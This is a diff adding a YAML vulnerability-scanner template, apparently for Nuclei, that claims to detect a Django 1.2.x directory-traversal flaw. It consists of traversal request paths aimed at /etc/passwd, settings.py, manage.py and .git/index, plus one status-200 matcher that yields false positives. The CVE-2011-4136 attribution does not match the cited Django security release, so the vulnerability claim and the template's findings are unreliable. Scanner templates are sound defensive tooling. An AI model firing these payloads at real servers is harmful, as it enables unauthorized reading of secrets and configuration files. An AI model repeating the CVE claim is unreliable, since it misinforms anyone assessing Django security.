@@ -1,0 +1,30 @@
+id: lfi-django-1-2-x
+
+info:
+  name: "Django 1.2.x LFI (Directory Traversal via static/media)"
+  author: XAKEP
+  severity: critical
+  description: "Local File Inclusion in Django 1.2.x and earlier via path traversal in static/media URLs (CVE-2011-4136)"
+  reference:
+    - "https://www.djangoproject.com/weblog/2011/nov/01/security-releases-issued/"
+  tags: lfi,django,traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static../manage.py"
+      - "{{BaseURL}}/media../manage.py"
+      - "{{BaseURL}}/static....//manage.py"
+      - "{{BaseURL}}/media%2e%2e%2fmanage.py"
+      - "{{BaseURL}}/static../.git/index"
+      - "{{BaseURL}}/media../.git/index"
+      - "{{BaseURL}}/static../etc/passwd"
+      - "{{BaseURL}}/media../settings.py"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"
+      Accept: "*/*"
+
+    matchers:
+      - type: status
+        status:
+          - 200
